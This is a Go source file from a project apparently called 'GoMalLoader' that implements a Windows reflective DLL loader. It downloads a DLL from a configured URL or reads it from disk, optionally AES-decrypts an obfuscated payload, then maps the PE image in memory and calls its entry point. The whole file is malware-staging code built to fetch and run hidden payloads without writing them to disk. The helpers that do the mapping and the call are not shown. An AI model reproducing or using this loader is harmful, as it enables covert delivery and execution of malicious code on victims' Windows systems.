//go:build windows

package loader

import (
	"io"
	"net/http"
	"os"

	"GoMalLoader/utils"
)

type windowsReflectiveLoader struct{}

func NewReflectiveLoader() ReflectiveLoader {
	return &windowsReflectiveLoader{}
}

func (l *windowsReflectiveLoader) Load(cfg LoaderConfig) error {
	var dllData []byte
	var err error

	if cfg.Source == "url" {
		resp, err := http.Get(cfg.URL)
		if err != nil {
			return err
		}
		defer resp.Body.Close()
		dllData, err = io.ReadAll(resp.Body)
	} else {
		dllData, err = os.ReadFile(cfg.Path)
	}
	if err != nil {
		return err
	}

	if cfg.Obfuscated {
		dllData, err = utils.AESDecrypt(dllData, []byte(cfg.AESKey))
		if err != nil {
			return err
		}
	}

	entry := utils.ParsePEAndLoad(dllData)
	utils.CallProc(entry)
	return nil
}
